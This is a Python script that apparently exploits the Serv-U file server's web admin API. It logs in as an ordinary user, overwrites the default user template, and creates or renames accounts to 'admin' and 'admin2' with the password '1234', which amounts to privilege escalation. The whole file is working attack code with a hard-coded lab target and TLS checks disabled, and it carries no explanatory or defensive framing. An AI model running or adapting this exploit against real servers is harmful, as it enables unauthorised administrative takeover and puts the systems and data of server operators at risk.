import requests
from threading import Thread
import xml.etree.ElementTree
import urllib3

urllib3.disable_warnings()

HOST = '10.0.0.212'
PASSWORD = '1234'
USERNAME = 'user'
DOMAIN_ID = 7786
TEMPLATE_USER_ID = 7964
ORG_ID = 7954

def getObjectID(txt):
    root = xml.etree.ElementTree.fromstring(txt)
    ret = None
    for child in root:
        if child.attrib['name'] == 'ObjectID':
            print(child.attrib['name'], child.attrib['val'])
            ret = child.attrib['val']
            break
    return ret

def main():
    s = requests.Session()

    r = s.post(url=f"https://{HOST}/WebClientApi/Login.json?Command=Login", data={'user':USERNAME, 'pword':PASSWORD}, verify=False)
    print(r.json())
    print()
    s.headers['X-Csrf-Token'] = r.json()['data']['csrfToken']

    if r.status_code != 200:
        print("Couldn't login, change params")
        return

    r = s.get(url=f"https://{HOST}/Admin/XML/User.xml?Command=CreateTempObject&Object=CDomain.{DOMAIN_ID}.User.{TEMPLATE_USER_ID}", verify=False)
    if r.status_code != 200:
        print("Couldn't get default user id")
        return

    TMP_USER_ID = getObjectID(r.text)

    req1_data = {
        'HasOwnHomeDirectory': "1",
        'LoginID': "Default User Template",
        'FullName': "",
        'Password': "<< Encrypted >>",
        'ComboHomeDir': "/",
        'HomeDir': "/",
        'ComboAdminType': "No Privilege",
        'AdminType': "2",
        'ComboType': "Permanent",
        'Type': "0",
        'ExpiresOn': "0",
        'EmailAddress': "",
        'LockInHomeDir': "0",
        'Enabled': "",
        'AlwaysAllowLogin': "",
        'RequirePasswordChange': "0",
        'Description': "",
        'SecurityMessages': "1",
        'FileDeletes': "0",
        'FTPCommands': "0",
        'SSHDetailedCommands': "0",
        'IPNames': "0",
        'FileDirRenames': "0",
        'FTPReplies': "0",
        'SSHDetailedReplies': "0",
        'Downloads': "0",
        'DirCreates': "0",
        'SSHCommands': "0",
        'HTTPCommands': "0",
        'ZippedDownloads': "0",
        'DirDeletes': "0",
        'SSHReplies': "0",
        'HTTPReplies': "0",
        'Uploads': "0",
        'FileShares': "0",
        'LogFilePath': "",
        'LogToFile': "0",
        'ComboLogFileArchiveMode': "Never",
        'LogFileArchiveMode': "0",
        'MaxLogFiles': "0",
        'MaxLogFilesBytes': "0",
        'CurrentLogFilePath': "/",
        'LoggingID': "4380981",
        'UserLoggingID': "4381010",
        'ComboLimitType': "Connection",
        'LimitType': "Connection",
        'TOTPLoginID': "Default User Template",
        'ComboTOTPProvisioning': "Disabled",
        'TOTPProvisioning': "",
        'ComboTOTPCompanyName': "Serv-U",
        'TOTPCompanyName': "",
        'TOTPProtected': "0",
        'QuotaBytes': "0",
        'Quota': "0",
        'IncludeRespCodesInMsgFiles': "1",
        'SignOnMessageFilePath': "",
        'SignOnMessage': "",
    }
    r = s.post(url=f"https://{HOST}/Admin/XML/Result.xml?Command=UpdateObject&Object=CDomain.{DOMAIN_ID}.User.{TEMPLATE_USER_ID}&ID={TMP_USER_ID}", data=req1_data, verify=False)

    if r.status_code != 200:
        print("Couldn't reset default user id permission")
        return
    print(r.text)

    r = s.post(url=f"https://{HOST}/Admin/XML/User.xml?Command=AddObject&Object=COrganization.{ORG_ID}.User&Temp=1", data={"LoginID":"qwe", 'Password':'1234'}, verify=False)
    r2 = s.post(url=f"https://{HOST}/Admin/XML/User.xml?Command=AddObject&Object=CDomain.{DOMAIN_ID}.User&Temp=1", data={"LoginID":"qwe", 'Password':'1234'}, verify=False)
    print(r.status_code, r.text)
    print(r2.status_code, r2.text)

    TMP_USER_ID = getObjectID(r.text)
    TMP_USER_ID2 = getObjectID(r2.text)

    r = s.post(url=f"https://{HOST}/Admin/XML/Result.xml?Command=UpdateObject&Object=COrganization.{ORG_ID}.User.{TMP_USER_ID}", data={"LoginID":"admin2", 'Password':'1234'}, verify=False)
    print("[*] temp1 user created")
    print(r.status_code, r.text)

    r = s.post(url=f"https://{HOST}/Admin/XML/Result.xml?Command=UpdateObject&Object=COrganization.{ORG_ID}.User.{TMP_USER_ID2}", data={"LoginID":"admin", 'Password':'1234'}, verify=False)
    print("[*] temp2 user created")
    print(r.status_code, r.text)

    r = s.post(url=f"https://{HOST}/Admin/XML/Result.xml?Command=UpdateObject&Object=CDomain.{DOMAIN_ID}.User.{TMP_USER_ID2}&ID={TMP_USER_ID2}", data={"LoginID":"admin", 'Password':'1234'}, verify=False)
    print("[*] temp2 user created")
    print(r.status_code, r.text)

    return

    r = s.post(url=f"https://{HOST}/Admin/XML/Result.xml?Command=UpdateObject&Object=COrganization.{ORG_ID}.User.{TMP_USER_ID}", data={"LoginID":"qwe", "Password":"1234"}, verify=False)
    print(r.status_code, r.text)

if __name__ == "__main__":
    main()
